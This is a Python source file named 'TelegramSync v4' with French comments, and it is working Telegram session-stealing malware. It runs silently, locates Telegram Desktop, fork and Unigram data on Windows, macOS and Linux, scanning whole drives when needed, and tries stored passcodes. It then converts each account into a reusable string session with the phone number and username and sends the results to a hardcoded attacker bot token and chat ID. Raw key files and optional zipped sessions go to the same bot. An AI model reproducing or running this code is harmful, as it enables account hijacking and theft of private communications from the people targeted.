# -*- coding: utf-8 -*-
"""
TelegramSync v4 - tdata -> manifeste -> bot.

Mode fantome : aucune fenetre, aucun popup, tout passe par le bot.
Ne modifie JAMAIS le tdata de la cible (lecture via copie temporaire).

v4 : Windows / macOS / Linux, forks tdesktop, Unigram (TDLib),
     manifeste seul (string_session), transport MTProto, logs par le bot.
     Aucun bruteforce : code d'acces via passcodes.txt / TG_PASSCODE.

Surcharges : TG_TDATA, TG_PASSCODE, TG_ZIP=1 (envoie aussi l'archive)
"""
import os, sys, json, shutil, asyncio, zipfile, tempfile, traceback
import subprocess, time, string, threading
import requests

IS_WIN = os.name == "nt"
IS_MAC = sys.platform == "darwin"

if sys.stdout is None or sys.stderr is None:
    class _Null:
        def write(self, *a): pass
        def flush(self): pass
        def isatty(self): return False
    sys.stdout = sys.stdout or _Null()
    sys.stderr = sys.stderr or _Null()

# ---------------------------------------------------------------- CONFIG
BOT_TOKEN = "8610466101:AAGrgL8oIrBRBDHsV0M_dC2mqwU7MKaZF5k"
CHAT_ID   = 8314393607

API_ID   = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"

# api_id/api_hash d'Unigram (Constants.cs du depot public).
# Laisse a 0 : le fichier key_datas sera envoye tel quel pour conversion manuelle.
UNIGRAM_API_ID   = 0
UNIGRAM_API_HASH = ""

PASSCODES = [""]
ZIP_MAX   = 40 * 1024 * 1024
# ----------------------------------------------------------------------

WORK = os.path.join(tempfile.gettempdir(), "tgsync")
_NO_WINDOW = 0x08000000 if IS_WIN else 0

DC_IP = {1: ("149.154.175.50", 443), 2: ("149.154.167.51", 443),
         3: ("149.154.175.100", 443), 4: ("149.154.167.91", 443),
         5: ("91.108.56.130", 443)}


# ------------------------------------------------------------- transport
_LOOP = asyncio.new_event_loop()
threading.Thread(target=_LOOP.run_forever, daemon=True).start()
_BOT = None


def _run(coro):
    return asyncio.run_coroutine_threadsafe(coro, _LOOP).result()


async def _bot_client():
    global _BOT
    if _BOT is None:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        c = TelegramClient(StringSession(), API_ID, API_HASH,
                           connection_retries=5, request_retries=5, timeout=30)
        await c.start(bot_token=BOT_TOKEN)
        _BOT = c
    return _BOT


def _http(method, **kw):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    kw.setdefault("timeout", (10, 120))
    last = None
    for i in range(3):
        try:
            r = requests.post(url, **kw)
            r.raise_for_status()
            return r.json()
        except requests.RequestException as e:
            last = e
            time.sleep(2 * (i + 1))
    raise last


# ------------------------------------------------------------- envoi
def tg_text(text):
    text = text[:4000]
    try:
        _run(_send_text(text))
        return "mtproto"
    except Exception:
        pass
    try:
        _http("sendMessage", data={"chat_id": CHAT_ID, "text": text})
        return "http"
    except Exception:
        return None


async def _send_text(text):
    await (await _bot_client()).send_message(CHAT_ID, text)


def log(msg):
    tg_text(msg)


def tg_file(path, caption=""):
    try:
        _run(_send_doc(path, caption))
        return "mtproto"
    except Exception:
        pass
    with open(path, "rb") as fh:
        _http("sendDocument",
              data={"chat_id": CHAT_ID, "caption": caption[:1000]},
              files={"document": fh})
    return "http"


async def _send_doc(path, caption):
    await (await _bot_client()).send_file(
        CHAT_ID, path, caption=caption[:1000],
        force_document=True, part_size_kb=512)


def tg_big(path, caption=""):
    if os.path.getsize(path) <= 45 * 1024 * 1024:
        return tg_file(path, caption)
    with open(path, "rb") as fh:
        i = 0
        while True:
            chunk = fh.read(45 * 1024 * 1024)
            if not chunk:
                break
            part = f"{path}.part{i:02d}"
            with open(part, "wb") as o:
                o.write(chunk)
            tg_file(part, f"{caption} [part {i:02d}]")
            os.remove(part)
            i += 1


# ------------------------------------------------------------- chemins
def exe_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(sys.argv[0]))


def home():
    return os.path.expanduser("~")


def load_passcodes():
    out = [""]
    for p in [os.environ.get("TG_PASSCODE")] + list(PASSCODES):
        if p is not None and p not in out:
            out.append(p)
    f = os.path.join(exe_dir(), "passcodes.txt")
    if os.path.isfile(f):
        try:
            with open(f, encoding="utf-8-sig") as fh:
                for line in fh:
                    line = line.strip()
                    if line and line not in out:
                        out.append(line)
        except OSError:
            pass
    return out


# ------------------------------------------------------------- detection
SKIP_DIRS = {"windows", "program files", "program files (x86)", "$recycle.bin",
             "system volume information", "recovery", "perflogs", "msocache",
             "config.msi", "onedrivetemp", "intel", "amd", "nvidia",
             "temp", "tmp", "cache", "cacheddata", "crashpad", "logs",
             "node_modules", ".git", ".cache", "dumps", "emoji", "user_data",
             "library", "applications", "system", "private", "proc", "sys",
             "dev", "run", "var", "boot", "snap", "dist", "assets"}

TDS = ("tdata", "tdata#2", "tdata#3")
NAMES = ("Telegram Desktop", "TelegramDesktop", "Telegram",
         "KotatogramDesktop", "Kotatogram", "64Gram", "64Gram Desktop",
         "Forkgram", "AyuGram Desktop", "AyuGramDesktop", "Materialgram")


def is_tdata(p):
    try:
        return os.path.isfile(os.path.join(p, "key_datas"))
    except OSError:
        return False


def user_bases():
    h = home()
    if IS_WIN:
        out = []
        for var in ("APPDATA", "LOCALAPPDATA"):
            b = os.environ.get(var)
            if b:
                out.append(b)
        out.append(h)
        return out
    if IS_MAC:
        return [os.path.join(h, "Library/Application Support")]
    out = []
    xdg = os.environ.get("XDG_DATA_HOME")
    if xdg:
        out.append(xdg)
    out.append(os.path.join(h, ".local/share"))
    out.append(os.path.join(h, ".var/app/org.telegram.desktop/data"))
    out.append(os.path.join(h, "snap/telegram-desktop/current/.local/share"))
    return out


def store_tdata_paths():
    if not IS_WIN:
        return []
    out = []
    pkgs = os.path.join(os.environ.get("LOCALAPPDATA") or "", "Packages")
    if not os.path.isdir(pkgs):
        return out
    try:
        for d in os.listdir(pkgs):
            if "telegram" not in d.lower():
                continue
            for sub in (r"LocalCache\Roaming\Telegram Desktop",
                        r"LocalCache\Roaming",
                        r"LocalCache\Local\Telegram Desktop"):
                out.append(os.path.join(pkgs, d, sub, "tdata"))
                out.append(os.path.join(pkgs, d, sub, "Telegram Desktop", "tdata"))
    except OSError:
        pass
    return out


def unigram_dirs():
    if not IS_WIN:
        return []
    out = []
    pkgs = os.path.join(os.environ.get("LOCALAPPDATA") or "", "Packages")
    if not os.path.isdir(pkgs):
        return out
    try:
        for d in os.listdir(pkgs):
            if "unigram" in d.lower():
                st = os.path.join(pkgs, d, "LocalState")
                if os.path.isdir(st):
                    out.append(st)
    except OSError:
        pass
    return out


def find_keyfile(root, depth=3):
    base = root.rstrip("\\/").count(os.sep)
    for cur, dirs, files in os.walk(root, onerror=lambda e: None):
        if cur.count(os.sep) - base > depth:
            dirs[:] = []
            continue
        dirs[:] = [x for x in dirs if x.lower() not in
                   {"cache", "td_cache", "temp", "logs", "webview"}]
        if "key_datas" in files:
            return os.path.join(cur, "key_datas")
    return None


def candidates():
    c = []
    if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]):
        c.append(sys.argv[1])
    if os.environ.get("TG_TDATA"):
        c.append(os.environ["TG_TDATA"])

    for b in user_bases():
        for n in NAMES:
            for t in TDS:
                c.append(os.path.join(b, n, t))

    c += store_tdata_paths()

    d = exe_dir()
    for base in (d, os.path.dirname(d), os.getcwd()):
        for t in TDS:
            c.append(os.path.join(base, t))
        c.append(os.path.join(base, "Telegram Desktop", "tdata"))

    seen, out = set(), []
    for x in c:
        try:
            k = os.path.normcase(os.path.abspath(x))
        except Exception:
            continue
        if k not in seen:
            seen.add(k)
            out.append(x)
    return out


def scan_roots():
    if IS_WIN:
        return [L + ":\\" for L in string.ascii_uppercase
                if os.path.isdir(L + ":\\")]
    h = home()
    roots = [h, os.path.join(h, "Desktop"), os.path.join(h, "Downloads"),
             os.path.join(h, "Documents"), os.path.join(h, "Bureau"),
             os.path.join(h, "Telechargements")]
    if IS_MAC:
        roots += ["/Applications", "/Volumes", "/Users/Shared"]
    else:
        roots += ["/opt", "/usr/local/share", "/media", "/mnt", "/srv"]
    return roots


def scan(roots, budget):
    t0 = time.time()
    found = []
    for r in roots:
        if not os.path.isdir(r):
            continue
        for cur, dirs, files in os.walk(r, onerror=lambda e: None):
            if time.time() - t0 > budget:
                return found
            if "key_datas" in files:
                found.append(cur)
                dirs[:] = []
                continue
            dirs[:] = [x for x in dirs if x.lower() not in SKIP_DIRS]
    return found


def find_tdata():
    report = []
    for p in candidates():
        if os.path.isdir(p):
            if is_tdata(p):
                report.append(("OK", p))
                return p, report
            report.append(("dir", p))
        else:
            report.append(("--", p))

    log("Aucun chemin standard. Scan (max 5 min)...")
    hits = scan(scan_roots(), budget=300)
    for h in hits:
        report.append(("SCAN", h))
    if hits:
        return hits[0], report

    for st, p in report:
        if st == "dir":
            return p, report
    return None, report


def diag_text(td, report):
    lines = [
        f"os={sys.platform}",
        f"user={os.environ.get('USER') or os.environ.get('USERNAME')}",
        f"home={home()}",
        f"bases={user_bases()}",
        f"exe={exe_dir()}",
        f"cwd={os.getcwd()}",
        f"unigram={unigram_dirs()}",
        f"trouve={td}",
        "---",
    ]
    lines += [f"{st} {p}" for st, p in report[:60]]
    return "\n".join(lines)


# ------------------------------------------------------------- tdata
_SKIP_IN_TDATA = {"user_data", "user_data#2", "user_data#3", "user_data#4",
                  "emoji", "shortcuts", "temp", "webview", "dumps"}


def snapshot_tdata(src, dst):
    shutil.rmtree(dst, ignore_errors=True)
    os.makedirs(dst, exist_ok=True)
    for name in os.listdir(src):
        p = os.path.join(src, name)
        try:
            if os.path.isfile(p):
                shutil.copy2(p, os.path.join(dst, name))
            elif os.path.isdir(p) and name not in _SKIP_IN_TDATA:
                shutil.copytree(p, os.path.join(dst, name), dirs_exist_ok=True)
        except OSError:
            pass
    return dst


def _pgrep(name):
    try:
        subprocess.check_output(["pgrep", "-x", name], stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False


def telegram_running():
    if not IS_WIN:
        return _pgrep("Telegram" if IS_MAC else "telegram-desktop")
    try:
        out = subprocess.check_output(
            ["tasklist", "/FI", "IMAGENAME eq Telegram.exe"],
            stderr=subprocess.DEVNULL, creationflags=_NO_WINDOW)
        return b"Telegram.exe" in out
    except Exception:
        return False


def zip_dir(src, dst):
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(src):
            for f in files:
                p = os.path.join(root, f)
                z.write(p, os.path.relpath(p, src))


# ------------------------------------------------------------- conversion
def load_tdesktop(tdata, passcodes):
    from opentele.td import TDesktop
    last = None
    for pc in passcodes:
        try:
            td = TDesktop(tdata, passcode=pc or None)
            if td.accountsCount > 0:
                return td, pc
            last = RuntimeError("0 compte charge")
        except Exception as e:
            last = e
    raise RuntimeError(f"tdata illisible : {last!r}")


async def convert_all(td, outdir):
    from opentele.api import API, UseCurrentSession
    from telethon.sessions import StringSession

    out = []
    for i, acc in enumerate(td.accounts):
        entry = {"index": i}
        client = None
        try:
            client = await acc.ToTelethon(
                session=os.path.join(outdir, f"account_{i}"),
                flag=UseCurrentSession,
                api=API.TelegramDesktop,
            )
            await client.connect()
            if not await client.is_user_authorized():
                raise RuntimeError("session non autorisee")
            me = await client.get_me()
            entry.update({
                "file": f"account_{i}.session",
                "id": me.id, "phone": me.phone, "username": me.username,
                "first_name": me.first_name, "last_name": me.last_name,
                "dc_id": client.session.dc_id,
                "string_session": StringSession.save(client.session),
            })
        except Exception as e:
            entry["error"] = repr(e)
        finally:
            if client is not None:
                try:
                    await client.disconnect()
                except Exception:
                    pass
        out.append(entry)
        log(f"compte #{i} : {'OK ' + str(entry.get('phone')) if 'error' not in entry else entry['error']}")
    return out


def run_once(tdata, passcodes, snap):
    snapshot_tdata(tdata, snap)
    td, used = load_tdesktop(snap, passcodes)
    return asyncio.run(convert_all(td, WORK)), used


# ------------------------------------------------------------- unigram
def tdlib_keys(path):
    with open(path, "rb") as f:
        raw = f.read()
    out = []
    for off in range(0, len(raw) - 259, 260):
        dc = int.from_bytes(raw[off:off + 4], "little", signed=True)
        out.append((dc, raw[off + 4:off + 260]))
    return out


async def unigram_sessions(keyfile, outdir):
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.crypto import AuthKey

    out = []
    for i, (dc, key) in enumerate(tdlib_keys(keyfile)):
        entry = {"index": i, "dc_id": dc, "client": "unigram"}
        if abs(dc) not in DC_IP:
            entry["error"] = f"dc inconnu {dc}"
            out.append(entry)
            continue
        client = None
        try:
            s = StringSession()
            s.set_dc(abs(dc), *DC_IP[abs(dc)])
            s.auth_key = AuthKey(key)
            client = TelegramClient(s, UNIGRAM_API_ID, UNIGRAM_API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                raise RuntimeError("cle refusee")
            me = await client.get_me()
            entry.update({
                "id": me.id, "phone": me.phone, "username": me.username,
                "first_name": me.first_name, "last_name": me.last_name,
                "string_session": client.session.save(),
            })
        except Exception as e:
            entry["error"] = repr(e)
        finally:
            if client is not None:
                try:
                    await client.disconnect()
                except Exception:
                    pass
        out.append(entry)
    return out


def handle_unigram(keyfile):
    log(f"Unigram detecte : {keyfile}")
    if not UNIGRAM_API_ID:
        log("api_id Unigram non configure : key_datas envoye brut.")
        tg_file(keyfile, "unigram key_datas")
        return []
    return asyncio.run(unigram_sessions(keyfile, WORK))


# ------------------------------------------------------------- main
def main():
    log(f"START os={sys.platform} user={os.environ.get('USER') or os.environ.get('USERNAME')}")

    accounts, used, tdata = [], None, None

    uni = []
    for st in unigram_dirs():
        kf = find_keyfile(st)
        if kf:
            uni = handle_unigram(kf) or []
            if uni:
                break

    tdata, report = find_tdata()
    log("DIAG\n" + diag_text(tdata, report))

    if not tdata:
        if not uni:
            log("RESULTAT: aucun tdata.\nTelegram Desktop absent ou jamais lance.")
            return
    elif not is_tdata(tdata):
        log(f"RESULTAT: {tdata} sans key_datas (jamais lance/connecte).")
    else:
        shutil.rmtree(WORK, ignore_errors=True)
        os.makedirs(WORK, exist_ok=True)
        snap = os.path.join(WORK, "tdata_snap")

        last = None
        for _ in range(3):
            try:
                res, used = run_once(tdata, load_passcodes(), snap)
                if res:
                    accounts = res
                    break
            except Exception as e:
                last = e
                log(f"essai KO : {e!r}")
                time.sleep(2)
        if not accounts:
            log(f"conversion impossible : {last!r}")

    accounts = (accounts or []) + uni
    if not accounts:
        log("RESULTAT: 0 compte.")
        return

    manifest = os.path.join(WORK if os.path.isdir(WORK) else tempfile.gettempdir(),
                            "manifest.json")
    with open(manifest, "w", encoding="utf-8") as f:
        json.dump({"source": tdata, "passcode": bool(used),
                   "host": os.environ.get("COMPUTERNAME") or os.uname().nodename
                   if hasattr(os, "uname") else os.environ.get("COMPUTERNAME"),
                   "accounts": accounts}, f, indent=2, ensure_ascii=False)

    ok = [a for a in accounts if "error" not in a]
    caption = (f"{len(ok)}/{len(accounts)} compte(s)\n"
               f"source : {tdata}\n"
               f"passcode : {'oui' if used else 'non'}\n"
               f"telegram ouvert : {'oui' if telegram_running() else 'non'}")
    log("COLIS\n" + caption)

    try:
        t = tg_file(manifest, "manifest.json")
        log(f"manifeste envoye ({t})")
    except Exception as e:
        log(f"manifeste KO : {e!r}")

    if os.environ.get("TG_ZIP") == "1" and os.path.isdir(WORK):
        z = os.path.join(tempfile.gettempdir(), "sessions.zip")
        zip_dir(WORK, z)
        if os.path.getsize(z) <= ZIP_MAX:
            try:
                tg_big(z, "sessions.zip")
            except Exception as e:
                log(f"zip KO : {e!r}")
        else:
            log("zip trop lourd, ignore")


if __name__ == "__main__":
    try:
        main()
    except Exception:
        tg_text("TelegramSync - ERREUR\n\n" + traceback.format_exc())
